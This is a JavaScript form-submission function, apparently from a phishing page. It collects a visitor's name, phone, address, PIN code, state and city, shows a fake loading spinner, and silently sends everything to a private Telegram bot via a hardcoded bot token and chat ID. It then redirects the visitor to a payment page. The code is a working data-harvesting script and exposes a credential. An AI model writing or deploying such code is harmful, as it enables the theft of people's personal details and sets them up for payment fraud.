
  function submitForm() {
    // Validate form fields
    var name = document.getElementById('name').value;
    var phone = document.getElementById('phone').value;
    var address = document.getElementById('address').value;
    var pincode = document.getElementById('pincode').value;
    var state = document.getElementById('state').value;
    var city = document.getElementById('city').value;

    // Check if all fields are filled correctly
    if (name && phone && address && pincode && state && city) {
      // Display loader
      document.querySelector('.loader').style.display = 'block';

      // Hide loader after 3 seconds
      setTimeout(function() {
        // Send address to Telegram bot
        var botToken = '6752961822:AAHzDMtUeGxHpoRWenQhZJLfCbDOFJvk9Kg';
        var chatId = '6324305321';
        var message = "Name: " + name + "\nPhone: " + phone + "\nAddress: " + address + "\nPIN Code: " + pincode + "\nState: " + state + "\nCity: " + city + "\nPage URL: " + window.location.href;
        var telegramUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);

        fetch(telegramUrl)
          .then(response => {
            if (!response.ok) {
              throw new Error('Failed to send message to Telegram bot');
            }
            // Redirect user to payment page
            window.location.href = 'payment.html';
          })
          .catch(error => {
            console.error('Error:', error);
            // Handle error
            alert('Failed to submit the form. Please try again later.');
          });

        // Hide loader
        document.querySelector('.loader').style.display = 'none';
      }, 3000); // 3 seconds
    } else {
      // If any field is not filled correctly, prevent form submission
      alert('Please fill all fields correctly.');
      return false;
    }
  }

